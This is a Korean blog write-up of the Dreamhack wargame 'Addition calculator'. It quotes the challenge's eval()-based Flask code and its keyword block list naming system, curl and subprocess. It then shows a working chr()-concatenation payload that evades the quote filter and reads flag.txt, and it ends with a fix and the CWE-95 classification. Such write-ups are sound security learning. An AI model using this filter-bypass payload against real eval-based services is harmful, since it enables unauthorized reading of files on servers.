웹 취약점 분석가를 목표로 공부하는 기록입니다. 이번 글은 드림핵 워게임의 Addition calculator를 풀어 본 과정입니다.

 

30초 요약

• 무엇이 취약했나: 사용자 입력을 eval()로 그대로 실행합니다.

• 어떻게 뚫었나: 파일 이름을 chr()로 만들어 따옴표 필터를 피했습니다.

• 결과: open().read()로 flag.txt를 읽어 플래그를 얻었습니다.

2. 단서

 

def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True

 

입력은 filter()를 통과해야 eval()에 들어갑니다. 따옴표가 허용 목록에 없어서 문자열을 직접 쓸 수 없습니다. system, flag 같은 단어도 막혀 있습니다.

 

        formula = request.form.get("formula", "")

            if filter(formula):
                return render_template("index.html", result="Filtered")
            else:
                try:
                    formula = eval(formula)
                    return render_template("index.html", result=formula)

 

필터를 통과한 입력은 eval()로 실행됩니다. 실행 결과는 그대로 화면에 출력됩니다.

 

3. 풀이 과정

 

필터에서 가장 크게 막힌 건 따옴표였습니다. 문자열을 직접 쓸 수 없어서 어떻게 할지 고민했습니다.

 

eval()로 돌아가는 명령어가 무엇이 있을지 생각했습니다. 구글링하다가 open()을 알게 됐습니다. 그래서 open('flag.txt', 'r').read()로 파일을 읽기로 했습니다.

 

① 식 전체를 str()로 바꾸기

 

처음에는 식 전체를 한 글자씩 바꿔 우회하려 했습니다. 아래 코드로 글자마다 str(번호)를 만들었습니다.

 

text = "open('flag.txt', 'r').read()"

for i in text:
    result = f"str({ord(i)})"

 

그런데 str(111)은 'o'가 아니라 '111'입니다. 원하는 글자가 나오지 않아서 chr()로 바꿨습니다.

 

② 식 전체를 chr()로 바꾸기

 

식 전체를 chr()로 만들어 입력창에 넣었습니다. 그런데 식이 문자열로 그대로 출력됐습니다.

 

[스크린샷: 식 전체를 chr()로 만들어 보냈을 때 open('flag.txt', 'r').read()가 그대로 출력된 화면]

 

open().read()는 실행되어야 하니 바꾸는 범위에서 빼야 했습니다. 처음에는 이 점을 생각하지 못했습니다. 그래서 파일 이름만 chr()로 만들기로 했습니다.

 

③ 파일 이름만 chr()로 바꾸기

 

파일 이름 flag.txt만 chr()로 만드는 파이썬 코드를 짰습니다.

 

text = "flag.txt"

result = ""
for i in text:
    result += f"chr({ord(i)})+"

print(f"open({result}).read()")

 

[참고] chr()로 만든 값은 이미 문자열입니다. 그래서 따옴표 없이 open()에 바로 넣을 수 있습니다.

 

출력 끝에 +가 하나 남아서 직접 지웠습니다. 완성한 입력은 아래와 같습니다.

 

open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()

 

이 입력을 브라우저 입력창에 넣자 플래그가 출력됐습니다.

 

DH{****}

 

[스크린샷: 플래그가 출력된 화면, 플래그 값은 가리기]

5. 원인과 대응

 

근본 원인은 입력 글자만 검사한 채 사용자 입력을 eval()로 실행한 것입니다.

 

[참고] 필터는 실행 중에 만들어지는 값을 보지 못합니다. 그래서 금지 글자를 다른 방법으로 만들면 통과합니다.

 

[참고] 대응은 eval()을 쓰지 않는 것입니다. 덧셈 계산기라면 입력을 + 기준으로 나눕니다. 각 조각이 숫자인지 확인한 뒤 int()로 더합니다.

 

[참고] 분류는 CWE-95(Eval Injection), OWASP Top 10 2021 A03 Injection입니다.
